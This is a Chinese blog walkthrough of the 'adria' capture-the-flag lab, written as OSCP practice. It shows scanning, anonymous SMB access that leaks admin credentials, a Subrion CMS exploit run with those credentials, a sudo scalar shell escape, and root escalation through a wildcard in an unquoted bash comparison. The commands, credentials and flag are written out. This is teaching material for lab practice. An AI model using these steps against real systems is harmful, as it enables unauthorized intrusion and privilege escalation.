#  【OSCP-Medium】adria   
原创 Beret-SEC  贝雷帽SEC   2024-11-18 01:21  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
**OSCP 靶场**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
## 靶场介绍  
<table><tbody><tr style="height: 33px;"><td width="100" style="border-width: 1px;border-style: solid;border-color: rgb(217, 217, 217);"><p style="margin: 0;padding: 0;min-height: 24px;"><span>adria</span></p></td><td width="82" style="border-width: 1px;border-style: solid;border-color: rgb(217, 217, 217);"><p style="margin: 0;padding: 0;min-height: 24px;"><span>medium</span></p></td><td width="575" style="border-width: 1px;border-style: solid;border-color: rgb(217, 217, 217);"><p style="margin: 0;padding: 0;min-height: 24px;"><span>smb、Subrion CMS 、脚本分析、sudo-scalar 提权、id_rsa、pspy64</span></p></td></tr></tbody></table>  
## 信息收集  
### 主机发现  
```
nmap -sn 192.168.1.0/24
```  
### 端口扫描  
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -A -p- -Pn -T4 192.168.1.61
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 13:27 +06
Nmap scan report for adria (192.168.1.61)
Host is up (0.0014s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-title: Did not follow redirect to http://adria.hmv/
|_http-server-header: Apache/2.4.57 (Debian)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-03-09T07:28:22
|_  start_date: N/A
|_clock-skew: 48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ADRIA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.36 seconds

```  
  
添加域名访问web  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLa0aFHAIkZib0etlbicy6ZKKn9KbCjzw0JOH8qPTu5l7lZ6YQFtXSsX2A/640?wx_fmt=png&from=appmsg "")  
### 目录扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLAvpnmgiclrewnjWO4coh5l5WDO2aAkYlOLDeBVT4AenrmjGuN1b7ztw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLcaN3hWf9ibhQ6bcibpZAxSibh1iasKf6BgMtE9CTHqw97DZuoouKB0NKDg/640?wx_fmt=png&from=appmsg "")  
### SMB 扫描  
  
使用 enum4linux 扫描发现了用户和DebianShare 共享目录  
```
enum4linux -a 192.168.1.61
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLQjOsXSIYWcU6bCKhnuR7zuWrgp47eXoGLQLibS6C84AcQ9Wa3w4fmzw/640?wx_fmt=png&from=appmsg "")  
  
使用smbclient 获取到一个configz.zip  压缩包  
```
smbclient -N -L \\\\192.168.1.61
```  
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L \\\\192.168.1.61

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        DebianShare     Disk      
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.1.61 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ smbclient -N \\\\192.168.1.61/DebianShare 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Dec  4 15:32:45 2023
  ..                                  D        0  Sat Jul 22 14:10:13 2023
  configz.zip                         N  2756857  Mon Nov  6 21:56:25 2023

                19480400 blocks of size 1024. 15678200 blocks available
smb: \> 
```  
  
我们从压缩包里面找到了账号密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLicjVLeCt29kH2656fz1ousQMibcYvt96T3WSZYQsWmSN3UKiaTQ8TZEaQ/640?wx_fmt=png&from=appmsg "")  
  
使用账号密码可登录到后台  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLWviaNpibbZeG3cRXn1NK8SRq5cibyeq9gtWc07h34gicEHSONF3BBDIJRA/640?wx_fmt=png&from=appmsg "")  
## 权限获取  
  
通过searchsploit 漏洞库里面找到exp  
```
searchsploit Subrion CMS  
searchsploit -m 49876 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLWOAB6vnEdT7umibcpPEpGPBuuukib8ZkokRgALXbrOMDhRfnjr1DCXgg/640?wx_fmt=png&from=appmsg "")  
  
使用前面收集到的账号密码进行利用  
```
┌──(kali㉿kali)-[~]
└─$ python3 49876.py
[+] Specify an url target
[+] Example usage: exploit.py -u http://target-uri/panel
[+] Example help usage: exploit.py -h
┌──(kali㉿kali)-[~]
└─$ python3 49876.py -h                          
Usage: 49876.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri http://target/panel
  -l USER, --user=USER  User credential to login
  -p PASSW, --passw=PASSW
                        Password credential to login
```  
```
python3 49876.py -u http://adria.hmv/panel/ -l admin -p jojo1989
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLrGiccTENGrb0bWwLuX2b3BsVib0XFPI9mLCXPG0NSRdFvtDPrl1XgLYA/640?wx_fmt=png&from=appmsg "")  
  
为了方便操作我们反弹一个交换shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLia0N8gsKr8s94DVzqmV5jtXibibUYFvGvhs4J9lX4lolWWjqhMvovichqQ/640?wx_fmt=png&from=appmsg "")  
## 权限提升  
### 普通账号  
```
www-data@adria:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
.....
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
adriana:x:1001:1001:,,,:/home/adriana:/bin/zsh
mysql:x:104:111:MySQL Server,,,:/nonexistent:/bin/false
www-data@adria:/var/www/html$ cd /home
www-data@adria:/home$ ls
adriana
www-data@adria:/home$ cd adriana/
bash: cd: adriana/: Permission denied
```  
  
查看sudo -l 可以看到adriana 用户可以使用scalar命令， Scalar 一个用于管理大型 Git 存储库的工具  
```
scalar命令使用：https://man7.org/linux/man-pages/man1/scalar.1.html
项目地址：https://github.com/microsoft/scalar
```  
```
www-data@adria:/home$ sudo -l
Matching Defaults entries for www-data on adria:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on adria:
    (adriana) NOPASSWD: /usr/bin/scalar
```  
  
这里我们输入help 查询帮助，会有一个交互界面，我们输入!bash 直接提权到了adriana 用户![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLFwd62sPAq8iavSo69uJ4bAKWSvArLsD2kHfudAofygFafshk5naTnqA/640?wx_fmt=png&from=appmsg "")  
  
  
这里发现发现存在id_rsa 私钥，我们私钥进行登录。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaL1JvJPsothfibN3HBz7IXGjRX5pR0vaicnO4sMaFXywB7huHgJ3GVHL6A/640?wx_fmt=png&from=appmsg "")  
### ROOT提权  
  
sudo -l 查看。可以免密执行backup 脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaL67REhbav0Sy8nxAzFGYrrMgTbVdibKf2vYW2rhduNhY1kjnYloeOVgw/640?wx_fmt=png&from=appmsg "")  
  
该脚本检索存储在/root/pass中的 root 密码。然后，它提示用户输入密码。如果输入的值与$PASSWORD变量中存储的密码匹配，则会打印“授予访问权限”消息，然后将html目录压缩到 .zip 文件中，并使用/root/pass中存储的密码进行加密。如果值不同，它只会打印“访问被拒绝”消息。  
```
╭─adriana@adria ~ 
╰─$ ls -all /opt/backup 
-rwxr-xr-x 1 root root 294 Nov  6 08:35 /opt/backup
╭─adriana@adria ~ 
╰─$ cat /opt/backup 
#!/bin/bash

PASSWORD=$(/usr/bin/cat /root/pass)

read -ep "Password: " USER_PASS

if [[ $PASSWORD == $USER_PASS ]] ; then

  /usr/bin/echo "Authorized access"
  /usr/bin/sleep 1
  /usr/bin/zip -r -e -P "$PASSWORD" /opt/backup.zip /var/www/html
else
  /usr/bin/echo "Access denied"
  exit 1
fi
╭─adriana@adria ~ 

```  
  
第7行的$PASSWORD == $USER_PASS，两个变量都没有加上引号，呈现上就是如果输入通配符*或者？的话会直接匹配成真    
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLwO6YJ96FqHzZVVw7b1R69oVRRhFibB7wDKibJWM4RvmMqibEyeiaFj9hsg/640?wx_fmt=png&from=appmsg "")  
  
我们尝试输入* 号可以发现，条件成立，直接进入if 条件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLvzxSdewa3mc72UJVakQeLloMnqQYNeJJ3DbjrrfI2JIDYMkNjGMPcg/640?wx_fmt=png&from=appmsg "")  
  
但是这里我们是看不到密码的，此时我们可以下载pspy64 进行进程  
```
https://github.com/DominicBreuker/pspy/releases
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLE14PAfGRRibxx1mTksMKicQ61yDCJ6l5lA2QA77qFibfuC7sEibZ2CpFZQ/640?wx_fmt=png&from=appmsg "")  
  
或者执行如下命令进行监视后台进程  
```
watch -n 0.1 -d "ps aux | grep -ai /usr/bin/zip"  
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaLxv16VIM2ibArlZJ6KuBezZOkP2bVzpUhqTSpEKbgHQRJElzRrHLkv4A/640?wx_fmt=png&from=appmsg "")  
  
获取root 密码后成功登录到系统获取flag  
```
 8eNctPoCh4Potes5eVD7eMxUw6wRBmO
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCB6ys5G2YsWAcsAyDg8ib8iaL4EdpzxhwrDyTuxlsXEQYeEIgzYQ2hSWia5Ek37JRBvHcDysv4mJQfLQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
                                          
  
End  
  
  
“点赞、在看与分享都是莫大的支持”  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lcbWX2ticDCDACJgvibBSia6MChia78vgBGURXW2Sq5o3uZTdw9oeR6yn90jH0BZrS0pl9ibYXicoDSXU8YkRQ49FjCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pM2klgicgT5dylTzXyrXBmex6dlAsZ0QJOQdzqcw2HpC49rnL0dTHNsWsOze4QmRYN7fPRoLdVK5MXs0DXtOvZw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
